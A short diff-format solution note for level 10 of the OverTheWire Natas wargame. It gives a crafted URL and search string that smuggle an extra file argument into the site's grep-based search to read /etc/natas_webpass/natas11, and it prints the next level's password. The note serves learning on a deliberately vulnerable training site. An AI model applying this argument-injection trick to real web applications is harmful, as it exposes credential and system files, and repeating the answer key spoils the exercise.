@@ -1,0 +1,8 @@
+Video Solution: https://youtu.be/SjGXUDQ-0Jc
+Task on Overthewire: http://overthewire.org/wargames/natas/
+
+http://natas10.natas.labs.overthewire.org/index.php?needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search
+
+.* /etc/natas_webpass/natas11
+
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
